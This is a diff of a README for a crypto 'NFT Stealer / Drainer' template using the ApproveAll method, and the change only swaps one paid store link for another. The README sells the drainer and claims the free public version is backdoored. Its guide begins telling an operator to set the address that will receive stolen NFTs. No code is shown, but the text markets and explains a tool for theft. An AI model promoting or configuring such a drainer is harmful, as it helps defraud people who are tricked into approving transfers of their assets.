@@ -1,4 +1,4 @@
-# ⚠️ PUBLIC GITHUB IS BACKDOORED AND SHOULD NOT BE USED !- STORE: https://web3eaters.sellix.io/
+# ⚠️ PUBLIC GITHUB IS BACKDOORED AND SHOULD NOT BE USED !- STORE: https://autodrainer.sellix.io/
 ### If you need any help, DM me here: [@soleaterdev](https://t.me/soleaterdev)
 
 ## 🖼️ NFT Stealer / Drainer With ApproveAll Method Template 
@@ -18,7 +18,7 @@
 ![Approveall](./approveall.png)
 ![Contract](./allnfts.png)
 
-# ⚠️ WILL NOT WORK IF YOU HAVENT BOUGHT THE FULL SOURCE !- STORE: https://web3eaters.sellix.io/
+# ⚠️ WILL NOT WORK IF YOU HAVENT BOUGHT THE FULL SOURCE !- STORE: https://autodrainer.sellix.io/
 # 👻 Guide: 
 In order to use this website, you need to edit the **index.js** file In The SRC>JS Folder
 Step 1: Change The ReciveAddress To The Address You Want To Recieve The NFTs On
